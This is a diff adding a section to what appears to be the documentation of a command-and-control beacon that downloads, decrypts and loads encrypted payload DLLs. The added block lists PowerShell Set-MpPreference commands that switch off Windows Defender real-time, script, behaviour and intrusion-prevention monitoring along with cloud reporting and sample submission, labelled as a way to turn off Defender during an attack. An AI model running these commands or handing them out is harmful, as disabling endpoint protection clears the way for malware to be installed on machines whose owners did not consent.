@@ -608,6 +608,26 @@ python3 tools/xor_encrypt.py payload.dll payload.dll.enc 41
 # 3. Beacon downloads, decrypts, and loads the DLL
 ```
 
+```bash
+# Turn off defender with uacbypass! (Doesn't work with tamper protection on)
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+
+# Turn off Cloud-delivered protection (MAPS)
+Set-MpPreference -MAPSReporting 0
+
+# Turn off Automatic sample submission
+Set-MpPreference -SubmitSamplesConsent 0
+
+# Check (AntivirusEnabled always true but didn't matter)
+Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, BehaviorMonitorEnabled, OnAccessProtectionEnabled, IsTamperProtected
+```
+
+**doc** https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps
+
 **Note**: The beacon prevents loading the same DLL twice (detected via DJB2 hash).
 
 ---
